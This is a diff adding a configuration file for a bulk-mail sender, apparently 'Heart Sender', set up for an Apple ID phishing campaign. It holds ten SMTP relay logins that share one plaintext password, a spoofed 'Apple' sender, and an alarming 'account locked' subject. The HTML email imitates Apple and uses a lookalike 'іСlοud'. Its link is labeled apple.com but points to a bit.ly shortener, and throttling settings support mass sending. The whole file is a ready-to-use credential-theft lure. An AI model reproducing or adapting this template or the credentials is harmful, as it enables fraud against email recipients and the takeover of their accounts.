@@ -1,0 +1,804 @@
+# HEART SENDER CONFIGURATION
+# SAVED AT : 09/01/2018 04:31:28
+
+[SMTP]
+smtp-relay.gmail.com|587|Y|Y|service1@requestedthroughs-gateway.org|@Dancok123|0
+smtp-relay.gmail.com|587|Y|Y|service2@requestedthroughs-gateway.org|@Dancok123|1
+smtp-relay.gmail.com|587|Y|Y|service3@requestedthroughs-gateway.org|@Dancok123|2
+smtp-relay.gmail.com|587|Y|Y|service4@requestedthroughs-gateway.org|@Dancok123|3
+smtp-relay.gmail.com|587|Y|Y|service5@requestedthroughs-gateway.org|@Dancok123|4
+smtp-relay.gmail.com|587|Y|Y|service6@requestedthroughs-gateway.org|@Dancok123|5
+smtp-relay.gmail.com|587|Y|Y|service7@requestedthroughs-gateway.org|@Dancok123|6
+smtp-relay.gmail.com|587|Y|Y|service8@requestedthroughs-gateway.org|@Dancok123|7
+smtp-relay.gmail.com|587|Y|Y|service9@requestedthroughs-gateway.org|@Dancok123|8
+smtp-relay.gmail.com|587|Y|Y|service10@requestedthroughs-gateway.org|@Dancok123|9
+[/SMTP]
+
+[FROMSUBJECT]
+[Important] - Your account Apple ID has been locked. Please update information your Apple account. [ 08 Dec 2018 ] Case ID##random_letterupp_10##
+[/FROMSUBJECT]
+
+[FROMNAME]
+Apple
+[/FROMNAME]
+
+[FROMMAIL]
+service-account-apple##random_letterlow_10##@##random_letterlow_10##.centre.com
+[/FROMMAIL]
+
+[ISHTML]
+TRUE
+[/ISHTML]
+
+[HEART_MAIL_MESSAGE]
+<!doctype html>
+<html xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml" xmlns:o="urn:schemas-microsoft-com:office:office">
+	<head>
+		<!-- NAME: FOLLOW UP -->
+		<!--[if gte mso 15]>
+		<xml>
+			<o:OfficeDocumentSettings>
+			<o:AllowPNG/>
+			<o:PixelsPerInch>96</o:PixelsPerInch>
+			</o:OfficeDocumentSettings>
+		</xml>
+		<![endif]-->
+		<meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+		<title>*|MC:SUBJECT|*</title>
+        
+    <style type="text/css">
+		p{
+			margin:10px 0;
+			padding:0;
+		}
+		table{
+			border-collapse:collapse;
+		}
+		h1,h2,h3,h4,h5,h6{
+			display:block;
+			margin:0;
+			padding:0;
+		}
+		img,a img{
+			border:0;
+			height:auto;
+			outline:none;
+			text-decoration:none;
+		}
+		body,#bodyTable,#bodyCell{
+			height:100%;
+			margin:0;
+			padding:0;
+			width:100%;
+		}
+		.mcnPreviewText{
+			display:none !important;
+		}
+		#outlook a{
+			padding:0;
+		}
+		img{
+			-ms-interpolation-mode:bicubic;
+		}
+		table{
+			mso-table-lspace:0pt;
+			mso-table-rspace:0pt;
+		}
+		.ReadMsgBody{
+			width:100%;
+		}
+		.ExternalClass{
+			width:100%;
+		}
+		p,a,li,td,blockquote{
+			mso-line-height-rule:exactly;
+		}
+		a[href^=tel],a[href^=sms]{
+			color:inherit;
+			cursor:default;
+			text-decoration:none;
+		}
+		p,a,li,td,body,table,blockquote{
+			-ms-text-size-adjust:100%;
+			-webkit-text-size-adjust:100%;
+		}
+		.ExternalClass,.ExternalClass p,.ExternalClass td,.ExternalClass div,.ExternalClass span,.ExternalClass font{
+			line-height:100%;
+		}
+		a[x-apple-data-detectors]{
+			color:inherit !important;
+			text-decoration:none !important;
+			font-size:inherit !important;
+			font-family:inherit !important;
+			font-weight:inherit !important;
+			line-height:inherit !important;
+		}
+		.templateContainer{
+			max-width:600px !important;
+		}
+		a.mcnButton{
+			display:block;
+		}
+		.mcnImage{
+			vertical-align:bottom;
+		}
+		.mcnTextContent{
+			word-break:break-word;
+		}
+		.mcnTextContent img{
+			height:auto !important;
+		}
+		.mcnDividerBlock{
+			table-layout:fixed !important;
+		}
+	/*
+	@tab Page
+	@section Heading 1
+	@style heading 1
+	*/
+		h1{
+			/*@editable*/color:#222222;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:40px;
+			/*@editable*/font-style:normal;
+			/*@editable*/font-weight:bold;
+			/*@editable*/line-height:150%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:center;
+		}
+	/*
+	@tab Page
+	@section Heading 2
+	@style heading 2
+	*/
+		h2{
+			/*@editable*/color:#222222;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:34px;
+			/*@editable*/font-style:normal;
+			/*@editable*/font-weight:bold;
+			/*@editable*/line-height:150%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Page
+	@section Heading 3
+	@style heading 3
+	*/
+		h3{
+			/*@editable*/color:#444444;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:22px;
+			/*@editable*/font-style:normal;
+			/*@editable*/font-weight:bold;
+			/*@editable*/line-height:150%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:center;
+		}
+	/*
+	@tab Page
+	@section Heading 4
+	@style heading 4
+	*/
+		h4{
+			/*@editable*/color:#999999;
+			/*@editable*/font-family:Georgia;
+			/*@editable*/font-size:20px;
+			/*@editable*/font-style:italic;
+			/*@editable*/font-weight:normal;
+			/*@editable*/line-height:125%;
+			/*@editable*/letter-spacing:normal;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Header
+	@section Header Container Style
+	*/
+		#templateHeader{
+			/*@editable*/background-color:#ffffff;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:54px;
+			/*@editable*/padding-bottom:54px;
+		}
+	/*
+	@tab Header
+	@section Header Interior Style
+	*/
+		.headerContainer{
+			/*@editable*/background-color:transparent;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:0;
+			/*@editable*/padding-bottom:0;
+		}
+	/*
+	@tab Header
+	@section Header Text
+	*/
+		.headerContainer .mcnTextContent,.headerContainer .mcnTextContent p{
+			/*@editable*/color:#808080;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:16px;
+			/*@editable*/line-height:150%;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Header
+	@section Header Link
+	*/
+		.headerContainer .mcnTextContent a,.headerContainer .mcnTextContent p a{
+			/*@editable*/color:#00ADD8;
+			/*@editable*/font-weight:normal;
+			/*@editable*/text-decoration:underline;
+		}
+	/*
+	@tab Body
+	@section Body Container Style
+	*/
+		#templateBody{
+			/*@editable*/background-color:#FFFFFF;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:0px;
+			/*@editable*/padding-bottom:0px;
+		}
+	/*
+	@tab Body
+	@section Body Interior Style
+	*/
+		.bodyContainer{
+			/*@editable*/background-color:transparent;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:0;
+			/*@editable*/padding-bottom:0;
+		}
+	/*
+	@tab Body
+	@section Body Text
+	*/
+		.bodyContainer .mcnTextContent,.bodyContainer .mcnTextContent p{
+			/*@editable*/color:#808080;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:16px;
+			/*@editable*/line-height:150%;
+			/*@editable*/text-align:left;
+		}
+	/*
+	@tab Body
+	@section Body Link
+	*/
+		.bodyContainer .mcnTextContent a,.bodyContainer .mcnTextContent p a{
+			/*@editable*/color:#00ADD8;
+			/*@editable*/font-weight:normal;
+			/*@editable*/text-decoration:underline;
+		}
+	/*
+	@tab Footer
+	@section Footer Style
+	*/
+		#templateFooter{
+			/*@editable*/background-color:#ffffff;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:87px;
+			/*@editable*/padding-bottom:87px;
+		}
+	/*
+	@tab Footer
+	@section Footer Interior Style
+	*/
+		.footerContainer{
+			/*@editable*/background-color:transparent;
+			/*@editable*/background-image:none;
+			/*@editable*/background-repeat:no-repeat;
+			/*@editable*/background-position:center;
+			/*@editable*/background-size:cover;
+			/*@editable*/border-top:0;
+			/*@editable*/border-bottom:0;
+			/*@editable*/padding-top:0;
+			/*@editable*/padding-bottom:0;
+		}
+	/*
+	@tab Footer
+	@section Footer Text
+	*/
+		.footerContainer .mcnTextContent,.footerContainer .mcnTextContent p{
+			/*@editable*/color:#FFFFFF;
+			/*@editable*/font-family:Helvetica;
+			/*@editable*/font-size:12px;
+			/*@editable*/line-height:150%;
+			/*@editable*/text-align:center;
+		}
+	/*
+	@tab Footer
+	@section Footer Link
+	*/
+		.footerContainer .mcnTextContent a,.footerContainer .mcnTextContent p a{
+			/*@editable*/color:#FFFFFF;
+			/*@editable*/font-weight:normal;
+			/*@editable*/text-decoration:underline;
+		}
+	@media only screen and (min-width:768px){
+		.templateContainer{
+			width:600px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		body,table,td,p,a,li,blockquote{
+			-webkit-text-size-adjust:none !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		body{
+			width:100% !important;
+			min-width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImage{
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnCartContainer,.mcnCaptionTopContent,.mcnRecContentContainer,.mcnCaptionBottomContent,.mcnTextContentContainer,.mcnBoxedTextContentContainer,.mcnImageGroupContentContainer,.mcnCaptionLeftTextContentContainer,.mcnCaptionRightTextContentContainer,.mcnCaptionLeftImageContentContainer,.mcnCaptionRightImageContentContainer,.mcnImageCardLeftTextContentContainer,.mcnImageCardRightTextContentContainer,.mcnImageCardLeftImageContentContainer,.mcnImageCardRightImageContentContainer{
+			max-width:100% !important;
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnBoxedTextContentContainer{
+			min-width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupContent{
+			padding:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnCaptionLeftContentOuter .mcnTextContent,.mcnCaptionRightContentOuter .mcnTextContent{
+			padding-top:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardTopImageContent,.mcnCaptionBottomContent:last-child .mcnCaptionBottomImageContent,.mcnCaptionBlockInner .mcnCaptionTopContent:last-child .mcnTextContent{
+			padding-top:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardBottomImageContent{
+			padding-bottom:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupBlockInner{
+			padding-top:0 !important;
+			padding-bottom:0 !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageGroupBlockOuter{
+			padding-top:9px !important;
+			padding-bottom:9px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnTextContent,.mcnBoxedTextContentColumn{
+			padding-right:18px !important;
+			padding-left:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcnImageCardLeftImageContent,.mcnImageCardRightImageContent{
+			padding-right:18px !important;
+			padding-bottom:0 !important;
+			padding-left:18px !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+		.mcpreview-image-uploader{
+			display:none !important;
+			width:100% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 1
+	@tip Make the first-level headings larger in size for better readability on small screens.
+	*/
+		h1{
+			/*@editable*/font-size:30px !important;
+			/*@editable*/line-height:125% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 2
+	@tip Make the second-level headings larger in size for better readability on small screens.
+	*/
+		h2{
+			/*@editable*/font-size:26px !important;
+			/*@editable*/line-height:125% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 3
+	@tip Make the third-level headings larger in size for better readability on small screens.
+	*/
+		h3{
+			/*@editable*/font-size:20px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Heading 4
+	@tip Make the fourth-level headings larger in size for better readability on small screens.
+	*/
+		h4{
+			/*@editable*/font-size:18px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Boxed Text
+	@tip Make the boxed text larger in size for better readability on small screens. We recommend a font size of at least 16px.
+	*/
+		.mcnBoxedTextContentContainer .mcnTextContent,.mcnBoxedTextContentContainer .mcnTextContent p{
+			/*@editable*/font-size:14px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Header Text
+	@tip Make the header text larger in size for better readability on small screens.
+	*/
+		.headerContainer .mcnTextContent,.headerContainer .mcnTextContent p{
+			/*@editable*/font-size:16px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Body Text
+	@tip Make the body text larger in size for better readability on small screens. We recommend a font size of at least 16px.
+	*/
+		.bodyContainer .mcnTextContent,.bodyContainer .mcnTextContent p{
+			/*@editable*/font-size:16px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}	@media only screen and (max-width: 480px){
+	/*
+	@tab Mobile Styles
+	@section Footer Text
+	@tip Make the footer content text larger in size for better readability on small screens.
+	*/
+		.footerContainer .mcnTextContent,.footerContainer .mcnTextContent p{
+			/*@editable*/font-size:14px !important;
+			/*@editable*/line-height:150% !important;
+		}
+
+}</style></head>
+    <body>
+		<!--*|IF:MC_PREVIEW_TEXT|*-->
+		<!--[if !gte mso 9]><!----><span class="mcnPreviewText" style="display:none; font-size:0px; line-height:0px; max-height:0px; max-width:0px; opacity:0; overflow:hidden; visibility:hidden; mso-hide:all;">Suspicious Activity !</span><!--<![endif]-->
+		<!--*|END:IF|*-->
+        <center>
+            <table align="center" border="0" cellpadding="0" cellspacing="0" height="100%" width="100%" id="bodyTable">
+                <tr>
+                    <td align="center" valign="top" id="bodyCell">
+                        <!-- BEGIN TEMPLATE // -->
+                        <table border="0" cellpadding="0" cellspacing="0" width="100%">
+							<tr>
+								<td align="center" valign="top" id="templateHeader" data-template-container>
+									<!--[if (gte mso 9)|(IE)]>
+									<table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
+									<tr>
+									<td align="center" valign="top" width="600" style="width:600px;">
+									<![endif]-->
+									<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
+										<tr>
+                                			<td valign="top" class="headerContainer"><table class="mcnImageBlock" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+    <tbody class="mcnImageBlockOuter">
+            <tr>
+                <td style="padding:9px" class="mcnImageBlockInner" valign="top">
+                    <table class="mcnImageContentContainer" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0" align="left">
+                        <tbody><tr>
+                            <td class="mcnImageContent" style="padding-right: 9px; padding-left: 9px; padding-top: 0; padding-bottom: 0;" valign="top">
+                                
+                                    
+                                        <img alt="" src="https://gallery.mailchimp.com/39679bec9876267ffb912f08c/images/0c368afd-2f2f-40e3-ae57-c03713544222.jpg" style="max-width:70px; padding-bottom: 0; display: inline !important; vertical-align: bottom;" class="mcnImage" width="70" align="right">
+                                    
+                                
+                            </td>
+                        </tr>
+                    </tbody></table>
+                </td>
+            </tr>
+    </tbody>
+</table></td>
+										</tr>
+									</table>
+									<!--[if (gte mso 9)|(IE)]>
+									</td>
+									</tr>
+									</table>
+									<![endif]-->
+								</td>
+                            </tr>
+							<tr>
+								<td align="center" valign="top" id="templateBody" data-template-container>
+									<!--[if (gte mso 9)|(IE)]>
+									<table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
+									<tr>
+									<td align="center" valign="top" width="600" style="width:600px;">
+									<![endif]-->
+									<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
+										<tr>
+                                			<td valign="top" class="bodyContainer"><table class="mcnTextBlock" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+    <tbody class="mcnTextBlockOuter">
+        <tr>
+            <td class="mcnTextBlockInner" style="padding-top:9px;" valign="top">
+              	<!--[if mso]>
+				<table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
+				<tr>
+				<![endif]-->
+			    
+				<!--[if mso]>
+				<td valign="top" width="600" style="width:600px;">
+				<![endif]-->
+                <table style="max-width:100%; min-width:100%;" class="mcnTextContentContainer" align="left" width="100%" cellspacing="0" cellpadding="0" border="0">
+                    <tbody><tr>
+                        
+                        <td class="mcnTextContent" style="padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18px;" valign="top">
+                        
+                            <table class="yiv1482689138iPhone_font" style="font-family:'Lucida Grande', Helvetica, Arial, sans-serif;font-size:inherit;line-height:18px;padding:0px;border:0px;">
+	<tbody>
+		<tr>
+			<td class="yiv1482689138content_margin" style="width:40px;"><br>
+			<br>
+			<br>
+			<br>
+			&nbsp;</td>
+			<td class="yiv1482689138iPhone_font" style="font-family:'Lucida Grande', Helvetica, Arial, sans-serif;line-height:18px;padding-top:44px;text-align:left;font-size:14px;color:#333;"><span style="font-family:arial,helvetica neue,helvetica,sans-serif"><img data-file-id="7011" src="https://gallery.mailchimp.com/39679bec9876267ffb912f08c/images/96481a44-b18e-4d24-a7d8-26c55a70a7de.jpg" style="border: 0px none; margin: 0px;" width="510" height="26"><br>
+			<br>
+			<br>
+			<br>
+			<br>
+			<br>
+			Dear ##email##,</span></td>
+			<td class="yiv1482689138content_margin" style="width:40px;">&nbsp;</td>
+		</tr>
+		<tr>
+			<td class="yiv1482689138content_margin" style="width:40px;">&nbsp;</td>
+			<td class="yiv1482689138iPhone_font" style="font-family:'Lucida Grande', Helvetica, Arial, sans-serif;line-height:18px;text-align:left;font-size:14px;color:#333;padding:17px 0 0 0;"><span style="font-family:arial,helvetica neue,helvetica,sans-serif">Your Apple ID (<a href="https://www.yahoo.com/" rel="nofollow" style="color:#2b2b2b;text-decoration:none;" target="_blank" ymailto="mailto:kinloch4@yahoo.com"><strong> ##email##</strong></a> ) was used to sign in to іСlοud on an iPad mini named “iPad”.</span></td>
+			<td class="yiv1482689138content_margin" style="width:40px;">&nbsp;</td>
+		</tr>
+		<tr>
+			<td class="yiv1482689138content_margin" style="width:40px;">&nbsp;</td>
+			<td class="yiv1482689138iPhone_font" style="font-family:'Lucida Grande', Helvetica, Arial, sans-serif;line-height:18px;text-align:left;font-size:14px;color:#333;padding:18px 0 0 0;">
+			<div><span style="font-family:arial,helvetica neue,helvetica,sans-serif">Date and Time: <strong>##date##</strong></span></div>
+
+			<div><span style="font-family:arial,helvetica neue,helvetica,sans-serif">Operating System: <strong>iOS 10</strong><br>
+			Country: <strong>israel</strong><br>
+			IP : <strong>19.29.210.18</strong></span></div>
+			</td>
+			<td class="yiv1482689138content_margin" style="width:40px;">&nbsp;</td>
+		</tr>
+		<tr>
+			<td class="yiv1482689138content_margin" style="width:40px;">&nbsp;</td>
+			<td class="yiv1482689138iPhone_font" style="font-family:'Lucida Grande', Helvetica, Arial, sans-serif;line-height:18px;text-align:left;font-size:14px;color:#333;padding:18px 0 0 0;"><span style="font-family:arial,helvetica neue,helvetica,sans-serif">If the Information above looks familliar, you can disregard this email.</span></td>
+			<td class="yiv1482689138content_margin" style="width:40px;">&nbsp;</td>
+		</tr>
+		<tr>
+			<td class="yiv1482689138content_margin" style="width:40px;">&nbsp;</td>
+			<td class="yiv1482689138letter_content yiv1482689138iPhone_font" style="font-family:'Lucida Grande', Helvetica, Arial, sans-serif;line-height:18px;text-align:left;font-size:14px;color:#333;padding:18px 0 15px 0;"><span style="font-family:arial,helvetica neue,helvetica,sans-serif">If you have not recently signed in to an iPad mini with your ID and believe someone may have accessed your account, go to Apple ID (<a href="http://bit.ly/2CKV9e4" rel="nofollow" style="color:#3399ff;text-decoration:none;" target="_blank"> https://www.apple.com</a> ) and update your Apple ID information as soon as possible.</span></td>
+			<td class="yiv1482689138content_margin" style="width:40px;">&nbsp;</td>
+		</tr>
+		<tr>
+			<td class="yiv1482689138content_margin" style="width:40px;">&nbsp;</td>
+			<td class="yiv1482689138iPhone_font" style="text-align:left;font-family:'Lucida Grande', Helvetica, Arial, sans-serif;line-height:18px;font-size:14px;color:#333;padding:17px 0 13px 0;"><span style="font-family:arial,helvetica neue,helvetica,sans-serif">Apple Support</span></td>
+		</tr>
+	</tbody>
+</table>
+
+                        </td>
+                    </tr>
+                </tbody></table>
+				<!--[if mso]>
+				</td>
+				<![endif]-->
+                
+				<!--[if mso]>
+				</tr>
+				</table>
+				<![endif]-->
+            </td>
+        </tr>
+    </tbody>
+</table><table class="mcnDividerBlock" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+    <tbody class="mcnDividerBlockOuter">
+        <tr>
+            <td class="mcnDividerBlockInner" style="min-width: 100%; padding: 18px 18px 0px;">
+                <table class="mcnDividerContent" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+                    <tbody><tr>
+                        <td>
+                            <span></span>
+                        </td>
+                    </tr>
+                </tbody></table>
+<!--            
+                <td class="mcnDividerBlockInner" style="padding: 18px;">
+                <hr class="mcnDividerContent" style="border-bottom-color:none; border-left-color:none; border-right-color:none; border-bottom-width:0; border-left-width:0; border-right-width:0; margin-top:0; margin-right:0; margin-bottom:0; margin-left:0;" />
+-->
+            </td>
+        </tr>
+    </tbody>
+</table><table class="mcnDividerBlock" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+    <tbody class="mcnDividerBlockOuter">
+        <tr>
+            <td class="mcnDividerBlockInner" style="min-width: 100%; padding: 9px 18px 0px;">
+                <table class="mcnDividerContent" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+                    <tbody><tr>
+                        <td>
+                            <span></span>
+                        </td>
+                    </tr>
+                </tbody></table>
+<!--            
+                <td class="mcnDividerBlockInner" style="padding: 18px;">
+                <hr class="mcnDividerContent" style="border-bottom-color:none; border-left-color:none; border-right-color:none; border-bottom-width:0; border-left-width:0; border-right-width:0; margin-top:0; margin-right:0; margin-bottom:0; margin-left:0;" />
+-->
+            </td>
+        </tr>
+    </tbody>
+</table><table class="mcnDividerBlock" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+    <tbody class="mcnDividerBlockOuter">
+        <tr>
+            <td class="mcnDividerBlockInner" style="min-width: 100%; padding: 18px 18px 0px;">
+                <table class="mcnDividerContent" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+                    <tbody><tr>
+                        <td>
+                            <span></span>
+                        </td>
+                    </tr>
+                </tbody></table>
+<!--            
+                <td class="mcnDividerBlockInner" style="padding: 18px;">
+                <hr class="mcnDividerContent" style="border-bottom-color:none; border-left-color:none; border-right-color:none; border-bottom-width:0; border-left-width:0; border-right-width:0; margin-top:0; margin-right:0; margin-bottom:0; margin-left:0;" />
+-->
+            </td>
+        </tr>
+    </tbody>
+</table></td>
+										</tr>
+									</table>
+									<!--[if (gte mso 9)|(IE)]>
+									</td>
+									</tr>
+									</table>
+									<![endif]-->
+								</td>
+                            </tr>
+                            <tr>
+								<td align="center" valign="top" id="templateFooter" data-template-container>
+									<!--[if (gte mso 9)|(IE)]>
+									<table align="center" border="0" cellspacing="0" cellpadding="0" width="600" style="width:600px;">
+									<tr>
+									<td align="center" valign="top" width="600" style="width:600px;">
+									<![endif]-->
+									<table align="center" border="0" cellpadding="0" cellspacing="0" width="100%" class="templateContainer">
+										<tr>
+                                			<td valign="top" class="footerContainer"><table class="mcnTextBlock" style="min-width:100%;" width="100%" cellspacing="0" cellpadding="0" border="0">
+    <tbody class="mcnTextBlockOuter">
+        <tr>
+            <td class="mcnTextBlockInner" style="padding-top:9px;" valign="top">
+              	<!--[if mso]>
+				<table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;">
+				<tr>
+				<![endif]-->
+			    
+				<!--[if mso]>
+				<td valign="top" width="600" style="width:600px;">
+				<![endif]-->
+                <table style="max-width:100%; min-width:100%;" class="mcnTextContentContainer" width="100%" cellspacing="0" cellpadding="0" border="0" align="left">
+                    <tbody><tr>
+                        
+                        <td class="mcnTextContent" style="padding-top:0; padding-right:18px; padding-bottom:9px; padding-left:18px;" valign="top">
+                        
+                            <div style="text-align: center;"><span class="yiv1482689138footer1" style="white-space:nowrap"><a rel="nofollow" style="color:#08c;text-decoration:none;" target="_blank">Apple ID </a><span style="color:#0000FF"> </span></span><span style="color:#0000FF"> |</span> <span class="yiv1482689138footer1" style="white-space:nowrap"> <a rel="nofollow" style="color:#08c;text-decoration:none;" target="_blank"> Support </a><span style="color:#0000FF"> </span></span><span style="color:#0000FF"> |</span> <span class="yiv1482689138footer1" style="white-space:nowrap"> <a rel="nofollow" style="color:#08c;text-decoration:none;" target="_blank"> Privacy Policy </a> </span><br>
+<span class="yiv1482689138bottomContent"><span style="color:#000000"><span class="yiv1482689138footer1" style="white-space:nowrap">Copyright © 2018 </span> Apple Inc. </span><span class="yiv1482689138nobr"><a href="https://mg.mail.yahoo.com/neo/b/message?search=1&amp;s=VHGn.uEKfLpl6g--%7EA&amp;encryptQ=1&amp;startMid=0&amp;blockimages=0&amp;sort=date&amp;order=down&amp;ac=Xj10xflQc6A4ovGwdSHqzPvT56w-&amp;.rand=497934313&amp;mid=AHKq1QoAAD__WbBIRg4s6P63fxk&amp;fid=Sent#address" id="yiv1482689138address" rel="nofollow" style="color:#888888;text-decoration:none;cursor:text;"><span style="color:#000000">1 Infinite Loop, Cupertino, CA 95014, United States.</span></a></span><span style="color:#000000"> <span class="yiv1482689138footer1" style="white-space:nowrap"> All rights reserved.</span></span></span></div>
+
+                        </td>
+                    </tr>
+                </tbody></table>
+				<!--[if mso]>
+				</td>
+				<![endif]-->
+                
+				<!--[if mso]>
+				</tr>
+				</table>
+				<![endif]-->
+            </td>
+        </tr>
+    </tbody>
+</table></td>
+										</tr>
+									</table>
+									<!--[if (gte mso 9)|(IE)]>
+									</td>
+									</tr>
+									</table>
+									<![endif]-->
+								</td>
+                            </tr>
+                        </table>
+                        <!-- // END TEMPLATE -->
+                    </td>
+                </tr>
+            </table>
+        </center>
+    </body>
+</html>
+[/HEART_MAIL_MESSAGE]
+
+[CONNECTION]
+1
+[/CONNECTION]
+
+[PAUSEEVERY]
+100
+[/PAUSEEVERY]
+
+[LONGSLEEP]
+3
+[/LONGSLEEP]
+
+[MAILPRIORITY]
+2
+[/MAILPRIORITY]
+
+[ISRETRYFAILED]
+FALSE
+[/ISRETRYFAILED]
+
+[RETRYFAILED]
+1
+[/RETRYFAILED]
